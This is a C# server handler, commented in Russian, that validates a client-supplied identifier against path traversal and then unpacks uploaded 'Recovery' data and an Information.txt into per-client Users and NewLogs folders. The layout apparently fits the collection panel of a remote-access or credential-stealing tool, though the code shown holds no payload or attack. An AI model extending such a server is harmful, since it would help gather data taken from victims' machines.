using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRecovery
{
    public static void Read(Clients clients, object[] array)
    {
        // 1. Получаем непроверенный идентификатор (часть пути) от клиента.
        string untrustedId = array[1]?.ToString();

        // Если идентификатор пустой, ничего не делаем.
        if (string.IsNullOrEmpty(untrustedId))
        {
            clients.Disconnect();
            return;
        }

        // 2. Определяем безопасные базовые директории.
        string usersBaseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users");
        string newLogsBaseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "NewLogs");

        // 3. Используем наш новый безопасный метод для получения полных путей.
        string clientUserPath = PathSanitizer.SanitizeAndResolvePath(untrustedId, usersBaseDir);
        string clientNewLogsPath = PathSanitizer.SanitizeAndResolvePath(untrustedId, newLogsBaseDir);

        // 4. ГЛАВНАЯ ПРОВЕРКА: Если какой-либо из путей null, это была попытка атаки (Path Traversal).
        if (clientUserPath == null || clientNewLogsPath == null)
        {
            // Логируем попытку атаки и отключаем клиента.
            Methods.AppendLogs(clients.IP, "Path Traversal-атака была заблокирована.", Color.Red);
            clients.Disconnect();
            return;
        }

        try
        {
            // 5. Создаем безопасные пути для файлов и папок, используя Path.Combine.
            string recoveryPath = Path.Combine(clientUserPath, "Recovery");
            string sourceInfoFile = Path.Combine(clientUserPath, "Information.txt");
            string destInfoFile = Path.Combine(clientNewLogsPath, "Information.txt");

            // Убеждаемся, что директории существуют.
            Directory.CreateDirectory(recoveryPath);
            Directory.CreateDirectory(clientNewLogsPath);

            // 6. Используем только безопасные, полные пути.
            Methods.AppendLogs(clients.IP, "Save logs in: " + recoveryPath, Color.MediumPurple);
            PaleFileProtocol.Unpack(recoveryPath, array[2] as byte[]);
            PaleFileProtocol.Unpack(clientNewLogsPath, array[2] as byte[]);

            // Проверяем, что исходный файл существует перед копированием
            if (File.Exists(sourceInfoFile))
            {
                File.Copy(sourceInfoFile, destInfoFile, true); // true - перезаписать, если существует
            }
        }
        catch (Exception ex)
        {
            // Логируем любую ошибку файловой системы
            Methods.AppendLogs(clients.IP, "Ошибка при обработке файлов: " + ex.Message, Color.Red);
        }
        finally
        {
            clients.Disconnect();
        }
    }
}